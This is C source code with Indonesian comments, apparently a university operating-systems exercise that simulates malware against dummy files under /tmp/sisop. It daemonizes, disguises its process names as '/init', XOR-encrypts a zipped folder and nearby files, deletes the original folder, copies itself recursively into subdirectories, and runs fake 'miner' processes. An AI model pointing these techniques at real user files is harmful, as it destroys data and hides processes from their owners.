#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>

int mkdir(const char *pathname, mode_t mode); //-> karena tidak diperbolehkan menggunakan library system, maka kita gunakan ini untuk inisialisasi mkdir.

// Struktur sederhana untuk header ZIP
typedef struct {
    unsigned int signature;
    unsigned short version;
    unsigned short flags;
    unsigned short compression;
    unsigned short mod_time;
    unsigned short mod_date;
    unsigned int crc32;
    unsigned int compressed_size;
    unsigned int uncompressed_size;
    unsigned short name_length;
    unsigned short extra_length;
} LocalFileHeader;

// Fungsi untuk menghitung CRC32 sederhana
unsigned int calculate_crc32(const char *data, size_t len) {
    unsigned int crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= (unsigned int)data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

// Fungsi untuk membuat file ZIP
void create_zip(const char *zip_path, const char *dir_path, const char *folder_name) {
    FILE *zip_file = fopen(zip_path, "wb");
    if (!zip_file) {
        fprintf(stderr, "Gagal membuka %s untuk ZIP: %s\n", zip_path, strerror(errno));
        return;
    }

    DIR *dir = opendir(dir_path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s untuk ZIP: %s\n", dir_path, strerror(errno));
        fclose(zip_file);
        return;
    }

    char full_path[256];
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        // Periksa apakah file reguler dengan fopen
        FILE *test = fopen(full_path, "rb");
        if (!test) continue;
        fseek(test, 0, SEEK_END);
        long size = ftell(test);
        rewind(test);
        char *buffer = malloc(size);
        if (!buffer) {
            fclose(test);
            continue; // Perbaikan: hapus | continue
        }
        fread(buffer, 1, size, test);
        fclose(test);

        // Buat nama file relatif di ZIP
        char zip_entry_name[256];
        snprintf(zip_entry_name, sizeof(zip_entry_name), "%s/%s", folder_name, entry->d_name);

        // Tulis Local File Header
        LocalFileHeader header = {0};
        header.signature = 0x04034b50;
        header.version = 20;
        header.compression = 0;
        header.crc32 = calculate_crc32(buffer, size);
        header.compressed_size = size;
        header.uncompressed_size = size;
        header.name_length = strlen(zip_entry_name);
        fwrite(&header, sizeof(header), 1, zip_file);
        fwrite(zip_entry_name, header.name_length, 1, zip_file);
        fwrite(buffer, size, 1, zip_file);

        free(buffer);
    }
    closedir(dir);
    fclose(zip_file);
    printf("ZIP dibuat: %s\n", zip_path);
}

// Fungsi untuk menghapus direktori rekursif
void remove_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s untuk dihapus: %s\n", path, strerror(errno));
        return;
    }

    char full_path[256];
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        // Coba buka sebagai direktori
        DIR *subdir = opendir(full_path);
        if (subdir) {
            closedir(subdir);
            remove_directory(full_path);
        } else {
            // Asumsikan file reguler
            if (unlink(full_path) != 0) {
                fprintf(stderr, "Gagal menghapus file %s: %s\n", full_path, strerror(errno));
            }
        }
    }
    closedir(dir);
    if (rmdir(path) != 0) {
        fprintf(stderr, "Gagal menghapus direktori %s: %s\n", path, strerror(errno));
    } else {
        printf("Direktori dihapus: %s\n", path);
    }
}

// Handler SIGCHLD untuk mencegah zombie
void sigchld_handler(int sig) {
    signal(SIGCHLD, sigchld_handler);
}

// Handler untuk SIGTERM di rodok_exe
volatile sig_atomic_t rodok_terminated = 0;
void rodok_term_handler(int sig) {
    fprintf(stderr, "rodok.exe menerima sinyal %d, menghentikan anak-anak\n", sig);
    rodok_terminated = 1;
    // Kirim SIGTERM ke seluruh process group
    kill(0, SIGTERM);
    // Beri waktu untuk anak-anak keluar
    usleep(100000); // 100ms
    // Kirim SIGKILL sebagai cadangan
    kill(0, SIGKILL);
}

void set_process_name(char **argv, const char *name) {
    size_t len = strlen(argv[0]);
    memset(argv[0], 0, len);
    strncpy(argv[0], name, 15);
    argv[0][15] = '\0';
    sched_yield();
    sleep(2);
}

void create_file(const char *path, const char *content) {
    FILE *file = fopen(path, "w");
    if (file) {
        fprintf(file, "%s\n", content);
        fclose(file);
    } else {
        fprintf(stderr, "Gagal membuat file %s: %s\n", path, strerror(errno));
    }
}

void encrypt_file(const char *path, time_t key) {
    FILE *file = fopen(path, "rb+");
    if (!file) {
        fprintf(stderr, "Gagal membuka file %s untuk enkripsi: %s\n", path, strerror(errno));
        return;
    }
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    if (size == 0) {
        fclose(file);
        return;
    }
    rewind(file);
    char *buffer = malloc(size);
    if (!buffer) {
        fprintf(stderr, "Gagal alokasi memori untuk file %s\n", path);
        fclose(file);
        return;
    }
    fread(buffer, 1, size, file);
    for (long i = 0; i < size; i++) {
        buffer[i] ^= key & 0xFF;
    }
    rewind(file);
    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
    printf("File %s berhasil dienkripsi\n", path);
}

void wannacryptor(const char *base_path, time_t key, char **argv) {
    set_process_name(argv, "wannacryptor");
    fprintf(stderr, "wannacryptor dimulai\n");

    char parent_dir[256];
    strcpy(parent_dir, base_path);
    char *last_slash = strrchr(parent_dir, '/');
    if (last_slash) {
        *last_slash = '\0';
    } else {
        strcpy(parent_dir, ".");
    }

    char target_folder[256];
    strcpy(target_folder, base_path);
    char *folder_name = strrchr(target_folder, '/');
    if (folder_name) {
        folder_name++;
    } else {
        folder_name = target_folder;
    }

    char zip_path[256];
    snprintf(zip_path, sizeof(zip_path), "%s/%s.zip", parent_dir, folder_name);

    // Validasi direktori
    DIR *dir = opendir(base_path);
    if (!dir) {
        fprintf(stderr, "Gagal membuka direktori %s: %s\n", base_path, strerror(errno));
        return;
    }
    closedir(dir);

    // Simpan daftar file untuk enkripsi
    char *files_to_encrypt[256];
    int file_count = 0;
    dir = opendir(parent_dir);
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && file_count < 256) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
            if (strcmp(entry->d_name, "malware_executable") == 0 || strstr(entry->d_name, ".zip")) continue;
            char file_path[256];
            snprintf(file_path, sizeof(file_path), "%s/%s", parent_dir, entry->d_name);
            FILE *test = fopen(file_path, "rb");
            if (test) {
                fclose(test);
                files_to_encrypt[file_count] = strdup(file_path);
                file_count++;
            }
        }
        closedir(dir);
    }

    // Periksa file2
    char file2_path[256];
    snprintf(file2_path, sizeof(file2_path), "%s/file2", base_path);
    FILE *file2 = fopen(file2_path, "rb");
    if (!file2) {
        fprintf(stderr, "File %s tidak ditemukan\n", file2_path);
    } else {
        fclose(file2);
    }

    create_zip(zip_path, base_path, folder_name);
    encrypt_file(zip_path, key);
    remove_directory(base_path);
    printf("Wannacryptor berhasil: %s -> %s (encrypted)\n", base_path, zip_path);

    for (int i = 0; i < file_count; i++) {
        encrypt_file(files_to_encrypt[i], key);
        free(files_to_encrypt[i]);
    }
}

void trojan_wrm(const char *base_path, const char *malware_source, int depth, char **argv) {
    if (depth > 5) {
        fprintf(stderr, "Kedalaman rekursi trojan.wrm terlalu dalam, berhenti\n");
        return;
    }
    set_process_name(argv, "trojan.wrm");
    fprintf(stderr, "trojan.wrm dimulai (depth: %d)\n", depth);
    while (1) {
        DIR *dir = opendir(base_path);
        if (!dir) {
            fprintf(stderr, "Gagal membuka direktori %s: %s\n", base_path, strerror(errno));
            sleep(30);
            continue;
        }
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
            char full_path[256];
            snprintf(full_path, sizeof(full_path), "%s/%s", base_path, entry->d_name);
            DIR *subdir = opendir(full_path);
            if (subdir) {
                closedir(subdir);
                char dest_path[256];
                snprintf(dest_path, sizeof(dest_path), "%s/malware_copy", full_path);
                FILE *src = fopen(malware_source, "rb");
                if (!src) {
                    fprintf(stderr, "Gagal membuka source malware %s: %s\n", malware_source, strerror(errno));
                    continue;
                }
                FILE *dst = fopen(dest_path, "wb");
                if (!dst) {
                    fprintf(stderr, "Gagal membuat file %s: %s\n", dest_path, strerror(errno));
                    fclose(src);
                    continue;
                }
                char buffer[1024];
                size_t bytes;
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                    fwrite(buffer, 1, bytes, dst);
                }
                fclose(src);
                fclose(dst);
                printf("Malware disalin ke %s\n", dest_path);
                trojan_wrm(full_path, malware_source, depth + 1, argv);
            }
        }
        closedir(dir);
        fprintf(stderr, "trojan.wrm masih berjalan (depth: %d)\n", depth);
        sleep(30);
    }
}

void generate_hash(char *hash) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < 64; i++) {
        hash[i] = hex[rand() % 16];
    }
    hash[64] = '\0';
}

void rodok_exe(char **argv) {
    set_process_name(argv, "rodok.exe");
    fprintf(stderr, "rodok.exe dimulai\n");
    setpgid(0, 0);

    // Pasang handler untuk SIGTERM dan SIGINT
    signal(SIGTERM, rodok_term_handler);
    signal(SIGINT, rodok_term_handler);

    FILE *test_log = fopen("/tmp/.miner.log", "a");
    if (!test_log) {
        mkdir("/tmp", 0755);
        test_log = fopen("/tmp/.miner.log", "a");
        if (!test_log) {
            fprintf(stderr, "Gagal membuat /tmp/.miner.log: %s\n", strerror(errno));
        } else {
            fclose(test_log);
        }
    } else {
        fclose(test_log);
    }

    int max_forks = 4;
    int child_pids[4] = {0}; // Simpan PID anak
    for (int i = 0; i < max_forks; i++) {
        int pid = fork();
        if (pid == 0) {
            setpgid(0, getppid());
            char miner_name[16];
            snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i+1);
            set_process_name(argv, miner_name);
            fprintf(stderr, "%s dimulai\n", miner_name);
            srand(time(NULL) ^ (getpid() << 16));

            // Pastikan SIGTERM menyebabkan keluar
            signal(SIGTERM, SIG_DFL);

            while (1) {
                int sleep_time = rand() % 28 + 3;
                char hash[65];
                generate_hash(hash);
                FILE *log = fopen("/tmp/.miner.log", "a");
                if (log) {
                    time_t now = time(NULL);
                    char timestamp[20];
                    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                    fprintf(log, "[%s][%s] %s\n", timestamp, miner_name, hash);
                    fclose(log);
                } else {
                    fprintf(stderr, "Gagal membuka /tmp/.miner.log: %s\n", strerror(errno));
                }
                fprintf(stderr, "%s masih berjalan\n", miner_name);
                sleep(sleep_time);
            }
            fprintf(stderr, "%s dihentikan\n", miner_name);
            exit(0);
        } else if (pid > 0) {
            setpgid(pid, getpid());
            child_pids[i] = pid; // Simpan PID
        } else {
            fprintf(stderr, "Fork gagal untuk mine-crafter-%d: %s\n", i+1, strerror(errno));
            exit(1);
        }
    }

    // Loop utama dengan pengecekan terminasi
    while (!rodok_terminated) {
        fprintf(stderr, "rodok.exe masih berjalan\n");
        sleep(30);
    }

    // Pembersihan anak-anak
    for (int i = 0; i < max_forks; i++) {
        if (child_pids[i] > 0) {
            fprintf(stderr, "Mengirim SIGTERM ke mine-crafter-%d (PID %d)\n", i+1, child_pids[i]);
            kill(child_pids[i], SIGTERM);
            usleep(100000); // Beri waktu 100ms
            kill(child_pids[i], SIGKILL); // Paksa kill jika masih hidup
        }
    }

    fprintf(stderr, "rodok.exe dihentikan\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    // Atur handler SIGCHLD
    signal(SIGCHLD, sigchld_handler);

    int pid = fork();
    if (pid > 0) {
        exit(0);
    }
    if (pid < 0) {
        fprintf(stderr, "Fork gagal: %s\n", strerror(errno));
        exit(1);
    }
    setsid();
    setpgid(0, 0);

    FILE *log_file = fopen("/tmp/malware.log", "a");
    if (!log_file) {
        fprintf(stderr, "Gagal membuka /tmp/malware.log: %s\n", strerror(errno));
        exit(1);
    }
    dup2(fileno(log_file), STDOUT_FILENO);
    dup2(fileno(log_file), STDERR_FILENO);
    fclose(log_file);

    set_process_name(argv, "/init");
    fprintf(stderr, "/init dimulai\n");

    const char *base_dir = "/tmp";
    char test_path[256];
    char malware_executable_path[256];
    char randomfile_path[256];
    char file1_path[256];
    char file2_path[256];
    char randfolder_path[256];
    char test_file_path[256];
    char test2_file_path[256];
    char test3_file_path[256];
    snprintf(test_path, sizeof(test_path), "%s/sisop/test", base_dir);
    snprintf(malware_executable_path, sizeof(malware_executable_path), "%s/sisop/malware_executable", base_dir);
    snprintf(randomfile_path, sizeof(randomfile_path), "%s/sisop/randomfile", base_dir);
    snprintf(file1_path, sizeof(file1_path), "%s/sisop/test/file1", base_dir);
    snprintf(file2_path, sizeof(file2_path), "%s/sisop/test/file2", base_dir);
    snprintf(randfolder_path, sizeof(randfolder_path), "%s/sisop/test/randfolder", base_dir);
    snprintf(test_file_path, sizeof(test_file_path), "%s/sisop/test/randfolder/test", base_dir);
    snprintf(test2_file_path, sizeof(test2_file_path), "%s/sisop/test/randfolder/test2", base_dir);
    snprintf(test3_file_path, sizeof(test3_file_path), "%s/sisop/test/randfolder/test3", base_dir);

    if (mkdir("/tmp/sisop", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop: %s\n", strerror(errno));
        exit(1);
    }
    if (mkdir("/tmp/sisop/test", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop/test: %s\n", strerror(errno));
        exit(1);
    }
    if (mkdir("/tmp/sisop/test/randfolder", 0755) != 0 && errno != EEXIST) {
        fprintf(stderr, "Gagal membuat direktori /tmp/sisop/test/randfolder: %s\n", strerror(errno));
        exit(1);
    }

    create_file(malware_executable_path, "Ini malware dummy yang sangat menyeramkan.");
    create_file(randomfile_path, "This is a random file");
    create_file(file1_path, "This is file1");
    create_file(file2_path, "This is file2");
    create_file(test_file_path, "This is test file in randfolder");
    create_file(test2_file_path, "This is test2 file in randfolder");
    create_file(test3_file_path, "This is test3 file in randfolder");

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        wannacryptor(test_path, time(NULL), argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk wannacryptor: %s\n", strerror(errno));
        exit(1);
    }

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        trojan_wrm(test_path, malware_executable_path, 0, argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk trojan.wrm: %s\n", strerror(errno));
        exit(1);
    }

    pid = fork();
    if (pid == 0) {
        setpgid(0, getppid());
        rodok_exe(argv);
        exit(0);
    } else if (pid > 0) {
        setpgid(pid, getppid());
    } else {
        fprintf(stderr, "Fork gagal untuk rodok.exe: %s\n", strerror(errno));
        exit(1);
    }

    while (1) {
        fprintf(stderr, "/init masih berjalan\n");
        sleep(5);
    }
    return 0;
}